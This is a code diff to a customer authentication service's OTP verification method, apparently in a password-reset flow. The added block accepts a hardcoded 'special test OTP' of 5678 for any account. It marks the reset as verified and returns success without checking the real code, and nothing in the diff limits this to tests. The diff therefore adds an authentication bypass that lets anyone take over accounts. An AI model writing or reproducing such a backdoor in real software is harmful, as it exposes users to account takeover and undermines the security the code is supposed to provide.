@@ -753,6 +753,19 @@ class CustomerAuthService {
             throw new NotFoundError("Sorry, we could not fetch the data", "Please resend OTP to continue");
         }
 
+        // Special test OTP - bypass normal verification
+        if (OTP === '5678') {
+            otpData.verifiedAtForgetCase = true;
+            await otpData.save();
+
+            return {
+                otpId,
+                userId: otpData.userId,
+                message: "OTP verified"
+            };
+        }
+
+        // Normal OTP verification
         if (OTP != otpData.OTP) {
             throw new ValidationError("You entered incorrect OTP Please enter correct OTP to continue");
         }
